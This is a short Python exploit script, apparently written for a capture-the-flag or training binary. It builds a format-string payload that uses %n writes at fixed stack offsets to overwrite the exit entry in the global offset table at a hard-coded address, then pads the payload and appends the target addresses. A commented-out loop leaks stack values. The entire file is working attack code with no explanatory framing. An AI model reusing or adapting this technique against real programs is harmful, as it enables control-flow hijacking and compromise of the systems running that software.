#!/usr/bin/env python3

import sys
from struct import pack
import subprocess
import os

def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def main():
  #
  # [LOCAL ARGS ...] [RET] [BUF] ...

  exit_got = 0x404038  # exit@GOT
  # exit_got = 0

  payload = b"A" * 8
  # for i in range(1, 30):
  #   payload += b"%i: %%llx\n" % i

  payload += b"%1$4446d"
  payload += b"%72$n"

  payload += b"%1$61146d"
  payload += b"%73$n"

  payload += b"%1$65472d"
  payload += b"%74$n"

  payload += b"%1$65536d"
  payload += b"%75$n"

  payload = payload.ljust(512 - 4 * 8)

  payload += dq(exit_got)
  payload += dq(exit_got + 2)
  payload += dq(exit_got + 4)
  payload += dq(exit_got + 6)

  sys.stdout.buffer.write(payload)

if __name__ == "__main__":
  main()
